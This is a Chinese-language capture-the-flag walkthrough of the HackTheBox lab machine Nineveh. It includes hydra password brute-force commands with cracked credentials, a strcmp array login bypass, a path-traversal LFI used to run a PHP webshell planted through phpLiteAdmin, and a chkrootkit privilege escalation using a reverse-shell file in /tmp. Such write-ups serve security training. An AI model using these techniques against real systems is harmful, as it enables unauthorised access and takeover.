## nmap

```Bash
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_http-title: Site doesn't have a title (text/html).
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)

```



## HTTP

80端口页面打开没有什么东西，目录爆破一下

```Bash
/index.html           (Status: 200) [Size: 178]
/info.php             (Status: 200) [Size: 83687]
/department           (Status: 301) [Size: 315] [--> http://10.10.10.43/department/]
/server-status        (Status: 403) [Size: 299]

```

443页面打开只有一张图片，目录爆破一下

```Bash
/index.html           (Status: 200) [Size: 49]
/db                   (Status: 301) [Size: 309] [--> https://10.10.10.43/db/]
/server-status        (Status: 403) [Size: 300]
/secure_notes         (Status: 301) [Size: 319] [--> https://10.10.10.43/secure_notes/]

```



### https

#### https://10.10.10.43/index.html

图片下载后分析下

```Bash
┌──(root㉿walle)-[/home/machines/linux/nineveh]
└─# curl https://10.10.10.43/ninevehForAll.png -k --output ninevehForAll.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  547k  100  547k    0     0   899k      0 --:--:-- --:--:-- --:--:--  900k

┌──(root㉿walle)-[/home/machines/linux/nineveh]
└─# ll
total 548
-rw-r--r-- 1 root root 560852 Jan  4 23:09 ninevehForAll.png

┌──(root㉿walle)-[/home/machines/linux/nineveh]
└─# binwalk ninevehForAll.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1336 x 508, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression

```

隐藏一个zlib文件， 不是标准的解压缩格式，用strings看得到的文本和直接看图片是一样的

```Bash
┌──(root㉿walle)-[/home/machines/linux/nineveh]
└─# binwalk -e  ninevehForAll.png --run-as=root

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1336 x 508, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression


┌──(root㉿walle)-[/home/machines/linux/nineveh]
└─# ll
total 552
-rw-r--r-- 1 root root 560852 Jan  4 23:09 ninevehForAll.png
drwxr-xr-x 2 root root   4096 Jan  4 23:11 _ninevehForAll.png.extracted

┌──(root㉿walle)-[/home/machines/linux/nineveh]
└─# cd _ninevehForAll.png.extracted

┌──(root㉿walle)-[/home/machines/linux/nineveh/_ninevehForAll.png.extracted]
└─# ll
total 548
-rw-r--r-- 1 root root      0 Jan  4 23:11 54
-rw-r--r-- 1 root root 560768 Jan  4 23:11 54.zlib

```

#### https://10.10.10.43/db

是phpLiteAdmin的管理界面，有RCE，版本也是匹配的，需要密码登录。

```Bash
┌──(root㉿walle)-[/home/machines/linux/cronos]
└─# searchsploit phpliteadmin
------------------------------------------------------------- ---------------------------------
 Exploit Title                                               |  Path
------------------------------------------------------------- ---------------------------------
phpLiteAdmin - 'table' SQL Injection                         | php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabilities                  | php/webapps/37515.txt
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection               | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                | php/webapps/39714.txt

```

只有password的界面用hydra尝试爆破，https-post-form已经声明了是https协议，所以这里不需要使用 -s 443增加端口，拿到密码password123

```Bash
└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43  https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-05 09:06:15
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password
[STATUS] 1290.00 tries/min, 1290 tries in 00:01h, 14343109 to do in 185:19h, 16 active
[443][http-post-form] host: 10.10.10.43   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-05 09:07:32

```

根据 php/webapps/24044.txt，构造payload，但是不知道要怎么触发hack.php的路径

![](https://secure2.wostatic.cn/static/qf7sYYTrscJC2KwWZxxqTJ/image.png?auth_key=1677499539-cv4LZF8PrmqfL1oTDhbMop-0-a5ec759396baf19a9ce881d453bf8399)



#### https://10.10.10.43/server-status 

403

#### https://10.10.10.43/secure_notes

nineveh.png中存在一个rsa私钥，提取出来，需要确定用户名； 这里提取这个key可以用binwalk -e 直接得到， 不需要手动从strings里面复制粘贴。



### http

#### http://10.10.10.43/info.php

![](https://secure2.wostatic.cn/static/bREp9XCqGK2B6jrwX7Yfk/image.png?auth_key=1677499539-a1K4KKqrhHWynHiXnnVKJJ-0-c95eecf3e20a49e3a09bae200076f010)

#### http://10.10.10.43/department

- 登录解法1  - 尝试用户名密码确认admin为合法的用户名，使用hydra爆破，拿到用户名密码

```Bash
└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43  http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid password"
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-05 11:28:53
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.10.43:80/department/login.php:username=admin&password=^PASS^:Invalid password
[STATUS] 2101.00 tries/min, 2101 tries in 00:01h, 14342298 to do in 113:47h, 16 active
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-05 11:31:14

```
- 登录解法2 - 这里的password判断用的弱类型比较，在post请求里面把password字段写成数组来绕过。

![](https://secure2.wostatic.cn/static/nrunNMjaatGU4WQxBhx1nc/image.png?auth_key=1677499539-t2k4dy1tbAAv9nsiYWhud7-0-97e71188357256969ef4f401ba3c1ae7)

```Bash
# 推测系统源代码写法如下
if(strcmp($_REQUEST['password'], $password)==0)
```





```Bash
# http://10.10.10.43/department/manage.php?notes=xxx 的格式看起来有LFI问题，尝试目录穿越

```

#### 巨坑

这里的LFI 有一个校验点，notes= 后面的内容必须包含ninevehNotes这个关键字，否则就是不成功的

也就是说，在phpliteadmin中创建的db名称如果带了这个关键字，是可以直接解析的

或者，在路径里面使用 ninevehNotes/../../../../xxx.php之类的写法，也是可以解析的

这个检查点没有任何提示，看了很多题解基本都是靠猜。

![](https://secure2.wostatic.cn/static/oMQuW69DGfWaZcQhMDjxrr/image.png?auth_key=1677499539-xc9bWT57aMdmnGD16z34oo-0-85168f8be41eac33b1aad3a822d26c6d)

所以这个LFI的触发关键 就是路径里面一定要有这个关键字



### shell

在db中写入一句话木马，利用LFI解析插入cmd字段执行反弹shell



## Privilege Escalation

www-data下可以直接拿到/home/amrois/user.txt



使用linpeas.sh有如下发现

```Bash
#mail中有疑点，root给amrois的邮件中提到了knock
From root@nineveh.htb  Fri Jun 23 14:04:19 2017
Return-Path: <root@nineveh.htb>
X-Original-To: amrois
Delivered-To: amrois@nineveh.htb
Received: by nineveh.htb (Postfix, from userid 1000)
        id D289B2E3587; Fri, 23 Jun 2017 14:04:19 -0500 (CDT)
To: amrois@nineveh.htb
From: root@nineveh.htb
Subject: Another Important note!
Message-Id: <20170623190419.D289B2E3587@nineveh.htb>
Date: Fri, 23 Jun 2017 14:04:19 -0500 (CDT)

Amrois! please knock the door next time! 571 290 911

#探测到了一个叫knockd的脚本，脚本是root所有，推测这个脚本应该是拿root权限用的
-rwxr-xr-x 1 root root 1572 Mar 25  2009 /etc/init.d/knockd
```



### www-data → amrois

尝试ssh  amrois@10.10.10.43，并使用在nineveh.png中提取出来的私钥

这里发现必须在拿到的shell中去ssh，不能直接从外部远程

```Bash
www-data@nineveh:/dev/shm$ ping nineveh.htb
PING nineveh.htb (127.0.1.1) 56(84) bytes of data.
64 bytes from nineveh.htb (127.0.1.1): icmp_seq=1 ttl=64 time=0.055 ms
64 bytes from nineveh.htb (127.0.1.1): icmp_seq=2 ttl=64 time=0.054 ms
64 bytes from nineveh.htb (127.0.1.1): icmp_seq=3 ttl=64 time=0.060 ms
^C
--- nineveh.htb ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.054/0.056/0.060/0.006 ms
www-data@nineveh:/dev/shm$

# 使用域名、127.0.0.1、 10.10.10.43都是可以远程的
www-data@nineveh:/dev/shm$ ssh -i id_rsa amrois@nineveh.htb
Could not create directory '/var/www/.ssh'.
The authenticity of host 'nineveh.htb (127.0.1.1)' can't be established.
ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Ubuntu 16.04.2 LTS
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
Permission denied (publickey).
www-data@nineveh:/dev/shm$
www-data@nineveh:/dev/shm$ chmod 600 id_rsa
www-data@nineveh:/dev/shm$ ssh -i id_rsa amrois@nineveh.htb
Could not create directory '/var/www/.ssh'.
The authenticity of host 'nineveh.htb (127.0.1.1)' can't be established.
ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

288 packages can be updated.
207 updates are security updates.


You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$

```



### amrois → root

#### knockd

什么是knockd？

[Port Knocking · Total OSCP Guide (gitbooks.io)](https://sushant747.gitbooks.io/total-oscp-guide/content/port_knocking.html)



```Bash
#邮件提示
Amrois! please knock the door next time! 571 290 911

# knockd是root进程
amrois@nineveh:~$ ps -ef | grep knock | grep -v grep
root      1323     1  0 Jan05 ?        00:04:12 /usr/sbin/knockd -d -i ens160

```

对响应的代码简单审计，knockd控制22端口启停，不过这里已经通过本地登录了，这个knock看起来没有什么用

```Bash
amrois@nineveh:/dev/shm$  cat /etc/init.d/knockd
#! /bin/sh

### BEGIN INIT INFO
# Provides:          knockd
# Required-Start:    $network $syslog
# Required-Stop:     $network $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: port-knock daemon
### END INIT INFO

PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
DAEMON=/usr/sbin/knockd
NAME=knockd
PIDFILE=/var/run/$NAME.pid
DEFAULTS_FILE=/etc/default/knockd  # 配置文件往下找
DESC="Port-knock daemon"
OPTIONS=" -d"
...


amrois@nineveh:/dev/shm$  cat /etc/default/knockd
################################################
#
# knockd's default file, for generic sys config
#
################################################

# control if we start knockd at init or not
# 1 = start
# anything else = don't start
#
# PLEASE EDIT /etc/knockd.conf BEFORE ENABLING  #配置文件往下找
START_KNOCKD=1

# command line options
KNOCKD_OPTS="-i ens160"


amrois@nineveh:/dev/shm$ cat /etc/knockd.conf
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911    # 敲门序列
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571      #关门序列
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```

按题解的教程尝试了一下敲门，把ssh端口打开

[https://wiki.archlinux.org/title/Port_knocking](https://wiki.archlinux.org/title/Port_knocking)  用nmap来遍历序列端口

![](https://secure2.wostatic.cn/static/bvaSA6txikaxcXQHammRY5/image.png?auth_key=1677499539-hgNHS7uueZKPjfncyuhWPy-0-7fd3c2c8ee3395d6f89f798e268eb012)





- 脚本在做什么？

```Bash
#有个cron脚本 10min 执行一次，删除/report下的内容
amrois@nineveh:~$ ls -l /usr/sbin/report-reset.sh
-rwxr-x--- 1 amrois amrois 34 Jul  2  2017 /usr/sbin/report-reset.sh

1、因为这个脚本的权限是amrois，修改这个脚本提权没有用
2、脚本删除的/report中的txt文件是在做什么？
```

txt中唯一提示不太一样的地方

![](https://secure2.wostatic.cn/static/5348N1eDYqJz8qNWn1rvo3/image.png?auth_key=1677499539-kwnaNpmg2224X3Bcm36VK5-0-8a968266a2c3672d12754b29aeb8525f)



chkrootkit漏洞

```Bash
└─# searchsploit chkrootkit
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                                                                                                                                                                                                       | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                                                                                                                                                                                               | linux/local/33899.txt

```

根据txt的描述，新建一个名为update的反弹shell文件放到/tmp中，等待被触发



什么是chkrootkit

[chkrootkit -- locally checks for signs of a rootkit](http://www.chkrootkit.org/)
